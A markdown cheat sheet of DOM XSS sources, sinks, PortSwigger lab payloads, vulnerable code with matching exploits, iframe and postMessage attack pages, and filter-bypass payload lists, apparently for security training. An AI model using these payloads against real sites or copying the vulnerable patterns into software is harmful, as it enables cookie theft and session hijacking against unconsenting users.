# DOM XSS - Attack Techniques & Payloads

## Sources (User-controllable input)
- `document.URL`
- `document.documentURI`
- `document.referrer`
- `location.search` (query string)
- `location.hash` (fragment)
- `location.href`
- `window.location`
- `document.cookie`
- `window.name`
- `postMessage` data

## Sinks (Dangerous output functions)
| Sink | Severity | Notes |
|------|----------|-------|
| `document.write()` | HIGH | Direct HTML injection |
| `innerHTML` | HIGH | HTML injection |
| `outerHTML` | HIGH | HTML injection |
| `eval()` | CRITICAL | JavaScript execution |
| `setTimeout(string)` | HIGH | JS execution |
| `setInterval(string)` | HIGH | JS execution |
| `Function()` | CRITICAL | JS execution |
| `location.href` | MEDIUM | URL redirect |
| `location.assign()` | MEDIUM | URL redirect |
| `location.replace()` | MEDIUM | URL redirect |
| `jQuery.html()` | HIGH | HTML injection |
| `jQuery.$()` | HIGH | HTML injection |

## PortSwigger Lab Payloads

### Lab: DOM XSS in document.write using source location.search
**Sink:** `document.write()`
**Source:** `location.search`
**Payload:**
```
/?search="><img src=x onerror=alert(document.cookie)>
```
**HTML context:** Search term reflected into `<img>` tag via `document.write()`

### Lab: DOM XSS in innerHTML using source location.search
**Sink:** `innerHTML`
**Source:** `location.search`
**Payload:**
```
/?search=<img src=x onerror=alert(document.cookie)>
```

### Lab: DOM XSS in jQuery anchor href attribute
**Sink:** `$(location.hash)`
**Source:** `location.hash`
**Payload:**
```
#<img src=x onerror=alert(document.cookie)>
```

### Lab: DOM XSS in jQuery selector sink
**Sink:** `$()` jQuery selector
**Source:** `location.hash`
**Payload:**
```
#<img src=x onerror=alert(document.cookie)>
```

### Lab: Reflected DOM XSS
**Sink:** `eval()`
**Source:** Server response
**Payload:** JSON response field containing JS
```
searchTerm\":\"-alert(1)}//"
```

### Lab: Stored DOM XSS
**Sink:** `innerHTML`
**Source:** WebSocket message
**Payload:** Via chat message
```
<img src=x onerror=alert(document.cookie)>
```

## Common DOM XSS Patterns

### document.write Sink
```javascript
// Vulnerable code
var search = new URLSearchParams(window.location.search).get('search');
document.write('<h1>Results for: ' + search + '</h1>');

// Exploit
// ?search="><script>alert(1)</script>
```

### innerHTML Sink
```javascript
// Vulnerable code
var name = location.hash.substring(1);
document.getElementById('output').innerHTML = name;

// Exploit
// #<img src=x onerror=alert(1)>
```

### jQuery $() Selector Sink
```javascript
// Vulnerable code
$(location.hash);

// Exploit
// #<img src=x onerror=alert(1)>
```

### eval() Sink
```javascript
// Vulnerable code
var data = JSON.parse(responseText);
eval('var result = ' + data.searchTerm);

// Exploit
// searchTerm field: "-alert(1)}//"
```

### setTimeout/setInterval Sink
```javascript
// Vulnerable code
setTimeout('updateDisplay("' + userInput + '")', 1000);

// Exploit
// Input: ");alert(1);//
```

### location Sink (Open Redirect → XSS chain)
```javascript
// Vulnerable code
var url = location.search.substring(1);
location.href = url;

// Exploit
// ?javascript:alert(document.cookie)
```

## jQuery hashchange DOM XSS

### Attack Vector
```html
<iframe src="https://target.com/#<img src=x onerror=alert(1)>" onload="this.src+='more'">
```

### Exploit HTML (for PortSwigger)
```html
<iframe id="f" src="https://TARGET-URL.net/" onload="setTimeout(()=>document.getElementById('f').src+='/<img%20src=x%20onerror=alert(document.cookie)>',1000)"></iframe>
```

### Alternative: Direct hashchange
```html
<iframe src="https://TARGET-URL.net/#" onload="this.contentWindow.location.hash='<img/src=x/onerror=alert(document.cookie)>'"></iframe>
```

## Web Message DOM XSS

### Attack Pattern
```html
<!-- Attacker page sends message to target iframe -->
<iframe id="victim" src="https://target.com/page"></iframe>
<script>
  document.getElementById('victim').onload = function() {
    this.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*');
  };
</script>
```

### PortSwigger Lab
```html
<iframe src="https://TARGET-URL.net/" onload="this.contentWindow.postMessage('<img src=x onerror=alert(document.cookie)>','*')"></iframe>
```

## CSS Selector Injection (jQuery)

### Via URL
```
https://target.com/?selector=<img src=x onerror=alert(1)>
```

### Via Hash
```
https://target.com/#<img src=x onerror=alert(1)>
```

## Debugging Tips
1. **Identify the source**: Check `location.search`, `location.hash`, `postMessage`, `document.referrer`
2. **Identify the sink**: Look for `document.write`, `innerHTML`, `eval()`, `$()`
3. **Trace the flow**: Follow data from source to sink in JavaScript
4. **Check for sanitization**: Are `<` and `>` encoded? Is quotes handled?
5. **Test context**: Is it HTML, attribute, JavaScript, or URL context?

## Bypassing Filters

### When `<script>` is blocked:
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### When quotes are filtered:
```
<img src=x onerror=alert(1)>
// No quotes needed in event handler
```

### When spaces are filtered:
```
<img/src=x/onerror=alert(1)>
// Slashes as separators
```

### JavaScript context bypass:
```
'-alert(1)-'
";alert(1);//
'-alert(document.cookie)-'
```
